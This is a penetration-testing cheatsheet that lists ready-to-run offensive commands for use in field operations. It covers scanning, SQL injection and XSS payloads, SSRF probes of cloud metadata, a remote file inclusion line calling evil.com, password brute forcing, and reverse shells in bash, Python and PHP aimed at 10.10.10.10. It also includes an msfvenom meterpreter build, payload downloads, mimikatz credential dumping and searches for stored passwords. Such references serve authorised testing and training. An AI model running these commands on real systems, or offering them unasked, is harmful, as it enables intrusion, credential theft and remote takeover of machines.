# Golden Pentesting Commands & Cheatsheet

## Purpose

A complete, all-in-one pentesting reference guide containing the most essential, complex, and real-world commands used in offensive security. Designed for field ops, GitHub showcases, day-to-day use, and interview prep.

---

## Table of Contents

- [Scanning and Enumeration](#scanning-and-enumeration)
- [Web Application Attacks](#web-application-attacks)
- [Credential Attacks and Password Cracking](#credential-attacks-and-password-cracking)
- [Reverse Shells and Payloads](#reverse-shells-and-payloads)
- [Privilege Escalation](#privilege-escalation)
- [File Transfer Techniques](#file-transfer-techniques)
- [Post Exploitation](#post-exploitation)
- [Useful Commands: Windows & Linux](#useful-commands-windows--linux)
- [Common Ports Reference](#common-ports-reference)
- [Tools Arsenal](#tools-arsenal)

---

## Scanning and Enumeration

### Nmap
```bash
nmap -sS -sC -sV -O -A -T4 -p- --open -oA fullscan target.com
nmap -Pn -n -sV -p 80,443,22 target.com
nmap --script vuln target.com
```

### Masscan
```bash
masscan -p1-65535 192.168.1.0/24 --rate=10000 -e tun0
```

### Rustscan
```bash
rustscan -a 10.10.10.10 --ulimit 5000 -- -sC -sV
```

### WhatWeb & Wappalyzer
```bash
whatweb target.com
wappalyzer https://target.com
```

### Gobuster / Dirsearch / FFUF
```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
ffuf -u http://target.com/FUZZ -w wordlist.txt -mc all
```

### DNS Enumeration
```bash
dig target.com any
host -t aaaa target.com
nslookup -query=mx target.com
```

---

## Web Application Attacks

### SQLMap
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --risk=3 --level=5 --batch
sqlmap -r request.txt --technique=BEUSTQ --dump
```

### XSS Payloads
```html
<script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
" onmouseover="alert('XSS')
```

### SSRF Test URLs
```
http://127.0.0.1:80
http://localhost/admin
http://169.254.169.254/latest/meta-data/
```

### File Upload Bypass
```
shell.php.jpg
image.php%00.jpg
Content-Type: image/png (actual payload inside)
```

### LFI/RFI
```
/etc/passwd
../../../../../../etc/shadow
http://evil.com/shell.txt
```

### curl for Exploitation
```bash
curl -X POST http://target.com/login -d "username=admin&password=admin"
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin
curl -k https://target.com --cookie "session=abcd123"
```

### wget
```bash
wget --user=admin --password=admin http://target.com/file
```

---

## Credential Attacks and Password Cracking

### Hydra
```bash
hydra -L users.txt -P passwords.txt ssh://target.com -t 4 -V
```

### Medusa
```bash
medusa -h target.com -U users.txt -P rockyou.txt -M ssh
```

### Hashcat
```bash
hashcat -m 0 -a 0 hashes.txt rockyou.txt
```

### John
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Reverse Shells and Payloads

### Bash
```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

### Python
```python
python -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.10.10.10",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh"])'
```

### PHP
```php
<?php system("/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"); ?>
```

### msfvenom
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe > shell.exe
```

---

## Privilege Escalation

### LinPEAS
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### WinPEAS
```cmd
winPEASany.exe
```

### Manual Checks
```bash
sudo -l
find / -perm -4000 -type f
cat /etc/passwd
ps aux | grep root
```

---

## File Transfer Techniques

### wget / curl
```bash
wget http://10.10.10.10/shell.sh
curl -O http://10.10.10.10/shell.sh
```

### Python HTTP Server
```bash
python3 -m http.server 8000
```

### nc (Netcat)
```bash
# Sender
nc -lvnp 4444 < file.txt

# Receiver
nc target 4444 > file.txt
```

### scp
```bash
scp user@target.com:/path/to/file ./
scp file.txt user@10.10.10.10:/tmp/
```

### smbclient
```bash
smbclient \\10.10.10.10\share -U guest
```

---

## Post Exploitation

### Enumeration
```bash
whoami
ip a
netstat -tulnp
```

### Passwords in Memory
```bash
grep -i pass /etc/*
strings *.db | grep password
```

### Credential Dumping (Windows)
```powershell
mimikatz.exe
sekurlsa::logonpasswords
```

---

## Useful Commands: Windows & Linux

### Linux
```bash
id
whoami
hostname -I
uname -a
df -h
```

### Windows
```cmd
systeminfo
net users
whoami /priv
reg query HKLM /f password /t REG_SZ /s
```

---

## Common Ports Reference

| Port  | Service                  |
|------ |---------------------------|
| 20,21 | FTP                       |
| 22    | SSH                       |
| 23    | Telnet                    |
| 25    | SMTP                      |
| 53    | DNS                       |
| 67,68 | DHCP                      |
| 69    | TFTP                      |
| 80    | HTTP                      |
| 110   | POP3                      |
| 111   | RPCBind                   |
| 123   | NTP                       |
| 135   | RPC                       |
| 137-139| NetBIOS                  |
| 143   | IMAP                      |
| 161   | SNMP                      |
| 389   | LDAP                      |
| 443   | HTTPS                     |
| 445   | SMB                       |
| 465   | SMTPS                     |
| 500   | IKE                       |
| 514   | Syslog                    |
| 587   | SMTP TLS                  |
| 631   | IPP                       |
| 993   | IMAPS                     |
| 995   | POP3S                     |
| 1433  | MS SQL                    |
| 1521  | Oracle DB                 |
| 2049  | NFS                       |
| 3306  | MySQL                     |
| 3389  | RDP                       |
| 5060  | SIP                       |
| 5432  | PostgreSQL                |
| 5900  | VNC                       |
| 5985  | WinRM (HTTP)              |
| 5986  | WinRM (HTTPS)             |
| 6379  | Redis                     |
| 8000  | Web Servers (alt)         |
| 8080  | HTTP Proxy/Web UI         |
| 8443  | HTTPS Alt                 |
| 9200  | Elasticsearch             |
| 11211 | Memcached                 |

---

## Tools Arsenal

| Category              | Tools Used                             |
|----------------------|-----------------------------------------|
| Scanning              | Nmap, Masscan, Rustscan                |
| Enumeration           | Enum4linux, smbclient, ldapsearch      |
| Web Testing           | Burp Suite, OWASP ZAP, sqlmap          |
| Exploitation          | Metasploit, msfvenom, Searchsploit     |
| Password Attacks      | Hydra, John, Hashcat                   |
| Post-Exploitation     | LinPEAS, WinPEAS, mimikatz             |
| File Transfer         | curl, wget, scp, nc, smbclient         |
| Reporting             | Obsidian, Notion, Markdown, CherryTree |

